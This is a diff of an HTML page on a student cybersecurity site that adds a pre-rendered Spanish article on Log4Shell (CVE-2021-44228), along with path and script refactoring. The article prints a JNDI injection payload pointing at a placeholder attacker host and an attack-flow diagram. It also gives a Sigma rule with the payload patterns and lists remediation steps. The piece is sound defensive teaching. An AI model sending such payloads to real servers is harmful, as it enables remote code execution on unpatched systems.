@@ -3,27 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Artículo - CiberCelia</title>
-  <meta name="description" content="Artículo y recurso didáctico de ciberseguridad para el alumnado del IES Celia Viñas.">
+  <title>Análisis en Profundidad de Log4Shell (CVE-2021-44228) - CiberCelia</title>
+  <meta name="description" content="Estudio técnico de una de las vulnerabilidades más críticas de la historia reciente: origen JNDI, mecanismo de inyección y contramedidas.">
+  <meta name="author" content="CiberCelia">
   
-  <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Análisis en Profundidad de Log4Shell (CVE-2021-44228) - CiberCelia">
+  <meta property="og:description" content="Estudio técnico de una de las vulnerabilidades más críticas de la historia reciente: origen JNDI, mecanismo de inyección y contramedidas.">
+  <meta property="og:image" content="../../assets/images/logo.svg">
+
+  <link rel="icon" type="image/svg+xml" href="../../assets/images/favicon.svg">
   
-  <!-- Google Fonts: Inter + JetBrains Mono -->
+  <!-- Google Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
   
   <!-- Stylesheets -->
-  <link rel="stylesheet" href="assets/css/style.css">
-  <link rel="stylesheet" href="assets/css/prism.css">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body>
 
-  <!-- Site Header -->
+  <!-- Header -->
   <header class="site-header">
     <div class="container nav-inner">
-      <a href="index.html" class="brand" aria-label="CiberCelia Inicio">
-        <img src="assets/images/logo.svg" alt="CiberCelia Shield" class="brand-logo" width="36" height="36">
+      <a href="../../index.html" class="brand" aria-label="CiberCelia Inicio">
+        <img src="../../assets/images/logo.svg" alt="CiberCelia Shield" class="brand-logo" width="36" height="36">
         <div class="brand-text">
           <span class="brand-title">CiberCelia</span>
           <span class="brand-subtitle">Ciberseguridad IES Celia Viñas</span>
@@ -31,9 +38,9 @@
       </a>
 
       <ul class="nav-links">
-        <li><a href="index.html#hub" class="nav-link">Hub</a></li>
+        <li><a href="../../index.html#hub" class="nav-link">Hub</a></li>
         <li><a href="https://cibercelia.github.io/glosario/" target="_blank" rel="noopener noreferrer" class="nav-link">Glosario</a></li>
-        <li><a href="index.html#contribuir" class="nav-link">Colaborar</a></li>
+        <li><a href="../../index.html#contribuir" class="nav-link">Colaborar</a></li>
       </ul>
 
       <div class="nav-actions">
@@ -53,11 +60,11 @@
     
     <!-- Breadcrumb -->
     <nav class="breadcrumb-nav" aria-label="Ruta de navegación">
-      <a href="index.html">Inicio</a>
+      <a href="../../index.html">Inicio</a>
       <span class="breadcrumb-separator">/</span>
-      <a href="index.html#hub" id="breadcrumb-category">Publicaciones</a>
+      <a href="../../index.html#hub">Artículos</a>
       <span class="breadcrumb-separator">/</span>
-      <span id="breadcrumb-title" style="color: var(--text-primary);">Artículo</span>
+      <span style="color: var(--text-primary);">Análisis en Profundidad de Log4Shell (CVE-2021-44228)</span>
     </nav>
 
     <!-- Main Article Card -->
@@ -66,43 +73,98 @@
       <!-- Article Header -->
       <header class="article-header-block">
         <div style="display: flex; align-items: center; justify-content: space-between; gap: 1rem; margin-bottom: 0.75rem;">
-          <span id="article-category-badge" class="category-tag post">POST</span>
+          <span class="category-tag post">POST</span>
           <div class="article-actions-bar">
-            <button id="share-btn" class="btn-article-action" onclick="copyArticleUrl(this)" title="Copiar enlace">
+            <button class="btn-article-action" onclick="copyArticleUrl(this)" title="Copiar enlace">
               <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
               <span>Compartir</span>
             </button>
-            <a id="github-edit-link" href="https://github.com/cibercelia/cibercelia" target="_blank" rel="noopener noreferrer" class="btn-article-action" title="Editar en GitHub">
+            <a href="https://github.com/cibercelia/cibercelia/blob/main/content/posts/02-analisis-vulnerabilidad-log4shell.md" target="_blank" rel="noopener noreferrer" class="btn-article-action" title="Editar en GitHub">
               <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
               <span>Editar en GitHub</span>
             </a>
           </div>
         </div>
 
-        <h1 id="article-title" class="article-main-title">Cargando artículo...</h1>
+        <h1 class="article-main-title">Análisis en Profundidad de Log4Shell (CVE-2021-44228)</h1>
 
         <div class="article-author-bar">
           <div class="article-author-left">
-            <span id="article-avatar" class="article-author-avatar">C</span>
+            <span class="article-author-avatar">C</span>
             <div class="article-author-meta">
-              <h4 id="article-author-name">Autor</h4>
-              <p id="article-meta-date">Fecha • Lectura</p>
+              <h4>
+                CiberCelia
+                <a href="https://github.com/cibercelia" target="_blank" class="nav-badge" style="margin-left: 0.5rem;">@cibercelia</a>
+              </h4>
+              <p>2026-10-02 • Lectura: 2 min</p>
             </div>
           </div>
-          <div id="article-tags-container" class="card-tags" style="margin-bottom: 0;"></div>
+          <div class="card-tags" style="margin-bottom: 0;"><span class="card-tag">#cve</span><span class="card-tag">#vulnerabilidad</span><span class="card-tag">#java</span><span class="card-tag">#jndi</span><span class="card-tag">#blueteam</span></div>
         </div>
       </header>
 
-      <!-- Markdown Article Content Body -->
-      <div id="article-content" class="markdown-body">
-        <!-- Rendered by content.js / MarkdownEngine -->
+      <!-- Pre-rendered HTML Body -->
+      <div class="markdown-body">
+        <h1>Análisis de la vulnerabilidad Log4Shell (CVE-2021-44228)</h1>
+<p>En diciembre de 2021 se descubrió una vulnerabilidad de ejecución remota de código (RCE) en la librería de registro <strong>Apache Log4j 2</strong>, bautizada como <strong>Log4Shell</strong>. Con una puntuación CVSS de <strong>10.0 (Crítica)</strong>, afectó a millones de servicios empresariales en todo el mundo.</p>
+<hr>
+<h2>¿Por qué ocurrió?</h2>
+<p>Log4j incluía una funcionalidad de sustitución de mensajes que permitía consultar datos dinámicos mediante <strong>JNDI (Java Naming and Directory Interface)</strong>:</p>
+<div class="code-wrapper" style="position: relative;">
+      <button class="code-copy-btn" onclick="copyCodeSnippet(this)">Copiar</button>
+      <pre class="language-text"><code class="language-text">${jndi:ldap://atacante.com/exploit}
+</code></pre>
+    </div>
+<p>Cuando Log4j procesaba un mensaje que contenía esta cadena (por ejemplo, en la cabecera <code>User-Agent</code> de una petición HTTP), intentaba contactar con el servidor LDAP del atacante y descargar una clase Java ejecutable.</p>
+<hr>
+<h2>Flujo del Ataque</h2>
+<div class="code-wrapper" style="position: relative;">
+      <button class="code-copy-btn" onclick="copyCodeSnippet(this)">Copiar</button>
+      <pre class="language-text"><code class="language-text">[Atacante] --( Petición HTTP con payload ${jndi:...} )--&gt; [Servidor Vulnerable (Log4j)]
+                                                                    |
+                                                            (Consulta LDAP JNDI)
+                                                                    v
+[Servidor LDAP Malicioso] &lt;-----------------------------------------+
+       |
+  (Envía clase Java maliciosa)
+       v
+[Servidor Vulnerable] ===&gt; ¡Ejecución remota de código en contexto de aplicación!
+</code></pre>
+    </div>
+<hr>
+<h2>Detección y Mitigación</h2>
+<h3>1. Regla Sigma para detección en logs de proxy o WAF:</h3>
+<div class="code-wrapper" style="position: relative;">
+      <button class="code-copy-btn" onclick="copyCodeSnippet(this)">Copiar</button>
+      <pre class="language-yaml"><code class="language-yaml">title: Detección de patrones JNDI en cabeceras HTTP
+status: production
+logsource:
+    category: webserver
+detection:
+    keywords:
+        - &#39;${jndi:ldap:&#39;
+        - &#39;${jndi:rmi:&#39;
+        - &#39;${jndi:dns:&#39;
+    condition: keywords
+falsepositives:
+    - Escaneos de seguridad autorizados
+level: critical
+</code></pre>
+    </div>
+<h3>2. Medidas de remediación inmediatas:</h3>
+<ul>
+<li>Actualizar Log4j a versiones <code>&gt;= 2.17.1</code>.</li>
+<li>Configurar la propiedad del sistema <code>log4j2.formatMsgNoLookups=true</code> en versiones 2.10 a 2.14.1.</li>
+<li>Restringir el tráfico saliente desde servidores de aplicaciones hacia puertos no estándar de LDAP/RMI.</li>
+</ul>
+
       </div>
 
       <!-- Bottom Contribution Box -->
       <div class="article-contrib-callout">
         <div class="article-contrib-text">
           <h4>¿Tienes correcciones o quieres publicar tu propio artículo?</h4>
-          <p>Puedes editar este documento o subir tus guías técnicas mediante Pull Request en el repositorio de CiberCelia.</p>
+          <p>Puedes proponer cambios o enviar tus propias guías técnicas mediante Pull Request en el repositorio de CiberCelia.</p>
         </div>
         <a href="https://github.com/cibercelia/cibercelia/blob/main/CONTRIBUTING.md" target="_blank" rel="noopener noreferrer" class="btn-primary-glow" style="flex-shrink: 0; font-size: 0.85rem; padding: 0.6rem 1.2rem;">
           <span>Guía de Contribución</span>
@@ -113,7 +175,7 @@
 
     <!-- Return to Hub Link -->
     <div style="text-align: center; margin-top: 2rem;">
-      <a href="index.html#hub" class="btn-article-action" style="padding: 0.6rem 1.4rem; font-size: 0.9rem;">
+      <a href="../../index.html#hub" class="btn-article-action" style="padding: 0.6rem 1.4rem; font-size: 0.9rem;">
         <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
         <span>Volver a todas las publicaciones</span>
       </a>
@@ -128,18 +190,15 @@
         CiberCelia • Recurso didáctico independiente para el alumnado del Curso de Especialización de Ciberseguridad del IES Celia Viñas. <em>No es la web oficial del centro.</em>
       </p>
       <p style="font-size: 0.8rem; color: var(--text-muted);">
-        <a href="index.html">Inicio</a> • <a href="https://cibercelia.github.io/glosario/" target="_blank">Glosario</a> • <a href="https://github.com/cibercelia" target="_blank">GitHub</a>
+        <a href="../../index.html">Inicio</a> • <a href="https://cibercelia.github.io/glosario/" target="_blank">Glosario</a> • <a href="https://github.com/cibercelia" target="_blank">GitHub</a>
       </p>
     </div>
   </footer>
 
   <!-- Scripts -->
-  <script src="assets/js/marked.min.js"></script>
-  <script src="assets/js/prism.js"></script>
-  <script src="assets/js/content.js"></script>
+  <script src="../../assets/js/prism.js"></script>
   <script>
     document.addEventListener('DOMContentLoaded', () => {
-      // Theme Support
       const themeToggleBtn = document.getElementById('theme-toggle');
       let currentTheme = localStorage.getItem('cibercelia-theme') || 'dark';
 
@@ -162,71 +221,26 @@
         });
       }
 
-      // Load Article by ID or Redirect to clean static URL
-      const params = new URLSearchParams(window.location.search);
-      const articleId = params.get('id');
-
-      if (articleId) {
-        // Auto-redirect to static pre-rendered URL
-        const allItems = [];
-        if (typeof CIBERCELIA_CONTENT !== 'undefined') {
-          if (CIBERCELIA_CONTENT.posts) allItems.push(...CIBERCELIA_CONTENT.posts);
-          if (CIBERCELIA_CONTENT.noticias) allItems.push(...CIBERCELIA_CONTENT.noticias);
-        }
-        const match = allItems.find(item => item.id === articleId);
-        if (match && match.permalink) {
-          window.location.replace(match.permalink);
-          return;
-        } else if (match) {
-          window.location.replace(`${match.category === 'post' ? 'posts' : 'noticias'}/${match.id}/`);
-          return;
-        }
-      }
-
-      const allItems = [];
-      if (typeof CIBERCELIA_CONTENT !== 'undefined') {
-        if (CIBERCELIA_CONTENT.posts) allItems.push(...CIBERCELIA_CONTENT.posts);
-        if (CIBERCELIA_CONTENT.noticias) allItems.push(...CIBERCELIA_CONTENT.noticias);
-      }
-
-      const article = allItems.find(item => item.id === articleId) || allItems[0];
-
-      if (article) {
-        document.title = `${article.title} - CiberCelia`;
-        document.getElementById('breadcrumb-title').textContent = article.title;
-        document.getElementById('breadcrumb-category').textContent = article.category === 'noticia' ? 'Noticias' : 'Artículos';
-        document.getElementById('breadcrumb-category').href = `index.html#hub`;
-
-        document.getElementById('article-category-badge').textContent = (article.badge || article.category).toUpperCase();
-        document.getElementById('article-category-badge').className = `category-tag ${article.category}`;
-
-        document.getElementById('article-title').textContent = article.title;
-        document.getElementById('article-avatar').textContent = article.author ? article.author.charAt(0).toUpperCase() : 'C';
-        document.getElementById('article-author-name').innerHTML = `
-          ${article.author || 'CiberCelia'}
-          ${article.author_github ? `<a href="https://github.com/${article.author_github}" target="_blank" class="nav-badge" style="margin-left: 0.5rem;">@${article.author_github}</a>` : ''}
-        `;
-        document.getElementById('article-meta-date').textContent = `${article.date || ''} ${article.readingTime ? `• Lectura: ${article.readingTime}` : ''}`;
-
-        // GitHub Edit Link
-        if (article.file) {
-          document.getElementById('github-edit-link').href = `https://github.com/cibercelia/cibercelia/blob/main/${article.file}`;
-        }
-
-        // Tags
-        const tagsHtml = (article.tags || []).map(t => `<span class="card-tag">#${t}</span>`).join('');
-        document.getElementById('article-tags-container').innerHTML = tagsHtml;
-
-        // Render Markdown
-        const renderedHtml = MarkdownEngine.render(article.content || article.summary);
-        document.getElementById('article-content').innerHTML = renderedHtml;
-
-        // Syntax Highlighting
-        if (window.Prism) {
-          Prism.highlightAllUnder(document.getElementById('article-content'));
-        }
+      if (window.Prism) {
+        Prism.highlightAll();
       }
     });
+
+    window.copyCodeSnippet = function(btn) {
+      const pre = btn.parentElement ? btn.parentElement.querySelector('pre code') : null;
+      const code = pre ? pre.innerText : (btn.nextElementSibling ? btn.nextElementSibling.innerText : '');
+      navigator.clipboard.writeText(code).then(() => {
+        const originalText = btn.innerText;
+        btn.innerText = '¡Copiado!';
+        btn.style.borderColor = '#10b981';
+        btn.style.color = '#10b981';
+        setTimeout(() => {
+          btn.innerText = originalText;
+          btn.style.borderColor = '';
+          btn.style.color = '';
+        }, 2000);
+      });
+    };
 
     window.copyArticleUrl = function(btn) {
       navigator.clipboard.writeText(window.location.href).then(() => {
